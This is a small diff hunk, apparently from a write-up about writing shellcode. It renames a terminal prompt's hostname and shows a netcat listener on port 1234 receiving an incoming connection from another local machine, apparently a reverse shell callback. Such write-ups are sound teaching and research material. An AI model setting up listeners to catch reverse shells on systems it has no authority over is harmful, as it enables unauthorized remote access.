@@ -449,7 +449,7 @@ Shellcode Length:  99
 ```
 
 ```terminal_session
-root@astrid:~/petprojects# nc -lvp 1234
+root@kali:~/petprojects# nc -lvp 1234
 listening on [any] 1234 ...
 192.168.1.192: inverse host lookup failed: Unknown host
 connect to [192.168.1.188] from (UNKNOWN) [192.168.1.192] 57324
